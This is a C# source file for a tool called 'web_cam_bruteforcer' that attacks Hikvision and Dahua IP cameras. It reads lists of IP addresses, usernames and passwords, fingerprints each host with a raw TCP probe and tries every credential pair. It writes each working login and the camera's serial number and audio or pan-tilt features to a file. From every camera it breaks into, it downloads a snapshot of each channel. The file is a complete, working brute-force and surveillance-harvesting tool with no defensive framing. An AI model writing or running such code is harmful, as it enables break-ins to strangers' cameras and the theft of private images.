using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using System.Text;
using CommandLine;

namespace web_cam_bruteforcer
{
    class Program
    {
        public static string IpsFile = "data/IPs.txt";
        public static string LoginFile = "data/logins.txt";
        public static string PasswordFile = "data/passwords.txt";
        public static string PicturesDir = "pictures";
        public static string OutputFile = "output.txt";
        public static bool FastMode;
        public static int Port;
        public static bool DahuaMode;

        static void Main(string[] args)
        {
            var options = new Options();
            if (Parser.Default.ParseArguments(args, options))
            {
                FastMode = options.FastMode;
                Port = options.Port;
                DahuaMode = options.Dagua;
            }
            CHCNetSDK.NET_DVR_Init();
            if (!FastMode) Preparation();
            Thread thread = new Thread(Start);
            thread.Start();
        }

        public static void Preparation()
        {
            if (!Directory.Exists(PicturesDir))
                Directory.CreateDirectory(PicturesDir);

            if (!File.Exists(OutputFile))
                File.Create(OutputFile).Dispose();

            if (!File.Exists(IpsFile) || !File.Exists(LoginFile) || !File.Exists(PasswordFile))
            {
                Console.WriteLine("Failed to load data");
                Console.ReadLine();
                Environment.Exit(0);
            }

            foreach (string host in File.ReadAllLines(IpsFile))
            {
                IPAddress ipAddress;
                bool isGoodHost = IPAddress.TryParse(host, out ipAddress);
                if (!isGoodHost)
                {
                    Console.WriteLine("Verify address " + host);
                    Console.ReadLine();
                    Environment.Exit(0);
                }
            }
        }

        public static void Start()
        {
            string[] logins = File.ReadAllLines(LoginFile);
            string[] passwords = File.ReadAllLines(PasswordFile);

            List<string> ips = File.ReadAllLines(IpsFile).ToList();
            List<Task> tasks = new List<Task>();
            foreach (string ip in ips)
            {
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Used " + ip + ":" + Port);
                Console.ResetColor();
                tasks.Add(Task.Factory.StartNew(() =>
                {
                    foreach (string login in logins)
                    {
                        foreach (string password in passwords)
                        {
                            if (!IsCamera(ip, Port))
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine(ip + ":" + Port + " is dead");
                                Console.ResetColor();
                                return;
                            }
                            if (BruteCam(ip, Port, login, password))
                            {
                                return;
                            }
                        }
                    }
                }));
            }
            Task.WaitAll(tasks.ToArray());
            Console.WriteLine("\n\nThe process is complete! Press enter to exit.");
            Console.ReadLine();
        }

        public static bool BruteCam(string ip, int port, string login, string password)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("Trying " + login + ":" + password + " for " + ip + ":" + port);
            Console.ResetColor();
            if (!DahuaMode)
            {
                CHCNetSDK.NET_DVR_DEVICEINFO_V30 deviceInfo = new CHCNetSDK.NET_DVR_DEVICEINFO_V30();
                int uid = CHCNetSDK.NET_DVR_Login_V30(ip, port, login, password, ref deviceInfo);
                if (uid != -1)
                {
                    var sn = Encoding.UTF8.GetString(deviceInfo.sSerialNumber).Replace("\0", "");

                    string features = "";

                    bool audio = IsAudio(sn);
                    bool ptz = IsPtz(sn);

                    if (audio)
                        features = "Audio";
                    if (ptz)
                        features = "PTZ";
                    if (!audio && !ptz)
                        features = "not found";

                    Console.ForegroundColor = ConsoleColor.Green;
                    var channels = deviceInfo.byChanNum;
                    Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port + ", channels: " + channels + ", features: " + features + ", SerialNumber: " + sn);
                    Console.ResetColor();
                    if (!FastMode)
                    {
                        if (!audio && !ptz)
                        {
                            AppendAllText(OutputFile, "Normal camera: " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber:" + sn + "\n");
                        }
                        if (audio)
                        {
                            AppendAllText(OutputFile, "Audio camera:  " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber:" + sn + "\n");
                        }
                        if (ptz)
                        {
                            AppendAllText(OutputFile, "PTZ camera:    " + login + ":" + password + "@" + ip + ":" + port + "; channels: " + channels + "; SerialNumber: " + sn + "\n");
                        }
                        for (int channel = deviceInfo.byStartChan; channel < deviceInfo.byChanNum + deviceInfo.byStartChan; channel++)
                        {
                            string filename = PicturesDir + "/" + login + "_" + password + "_" + ip + "_" + port + "_" + channel + ".jpg";
                            CHCNetSDK.NET_DVR_JPEGPARA netDvrJpegpara = new CHCNetSDK.NET_DVR_JPEGPARA
                            {
                                wPicQuality = 0,
                                wPicSize = 2
                            };
                            if (CHCNetSDK.NET_DVR_CaptureJPEGPicture(uid, channel, ref netDvrJpegpara, filename))
                            {
                                Image image = Image.FromFile(filename);
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.WriteLine("Downloaded picture (channel " + channel + ", size " + image.Width + "x" + image.Height + ") from the camera " + ip + ":" + port);
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("Could not download picture from " + ip + ":" + port + " (channel " + channel + ")");
                                Console.ResetColor();
                            }
                        }
                    }
                    CHCNetSDK.NET_DVR_Logout_V30(uid);
                    return true;
                }
            }
            else
            {
                Dahua.CLIENT_Init(ip);
                if (Dahua.CLIENT_Login(ip, port, login, password) != 0)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Logged in: " + login + ":" + password + "@" + ip + ":" + port);
                    Console.ResetColor();
                    AppendAllText(OutputFile, "Dahua camera:  " + login + ":" + password + "@" + ip + ":" + port + "\n");
                    return true;
                }
            }
            return false;
        }

        public static bool IsCamera(string server, int port)
        {
            if (DahuaMode) return true;
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    byte[] message =
                    {
                        0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                    };
                    tcpClient.Connect(server, port);
                    NetworkStream networkStream = tcpClient.GetStream();
                    networkStream.Write(message, 0, message.Length);
                    byte[] response = new byte[16];
                    networkStream.Read(response, 0, response.Length);
                    tcpClient.Close();
                    networkStream.Close();
                    return response[3] == 0x10 && response[7] == response[11];
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }

        public static bool IsAudio(string sn)
        {
            foreach (string audio in CamList.AudioCams)
            {
                if (sn.Contains(audio))
                {
                    return true;
                }
            }
            return false;
        }

        public static bool IsPtz(string sn)
        {
            foreach (string ptz in CamList.PtzCams)
            {
                if (sn.Contains(ptz))
                {
                    return true;
                }
            }
            return false;
        }

        public static void AppendAllText(string path, string line)
        {
            try
            {
                using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.Read))
                using (StreamWriter streamWriter = new StreamWriter(fileStream, Encoding.UTF8))
                {
                    streamWriter.Write(line);
                }
            }
            catch (AggregateException)
            {
            }
        }
    }

    public class Options
    {
        [Option('f', "fast", DefaultValue = false)]
        public bool FastMode { get; set; }

        [Option('p', "port", DefaultValue = 8000)]
        public int Port { get; set; }

        [Option('d', "dahua", DefaultValue = false)]
        public bool Dagua { get; set; }

        [ParserState]
        public IParserState LastParserState { get; set; }

        [HelpOption]
        public string GetUsage()
        {
            return "";
        }
    }
}